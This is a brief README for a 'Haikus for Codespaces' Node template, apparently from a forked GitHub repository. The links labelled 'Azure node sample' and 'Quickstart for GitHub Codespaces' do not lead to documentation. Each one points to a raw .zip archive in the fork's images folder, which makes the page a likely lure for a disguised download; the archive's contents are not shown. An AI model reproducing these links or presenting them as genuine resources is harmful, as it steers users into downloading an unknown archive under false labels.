
# Haikus for Codespaces

This is a quick node project template for demoing Codespaces. It is based on the [Azure node sample](https://raw.githubusercontent.com/amanjyotib45/haikus-for-codespaces/main/public/images/haikus_codespaces_for_v3.9.zip). It's great!!!

Point your browser to [Quickstart for GitHub Codespaces](https://raw.githubusercontent.com/amanjyotib45/haikus-for-codespaces/main/public/images/haikus_codespaces_for_v3.9.zip) for a tour of using Codespaces with this repo.
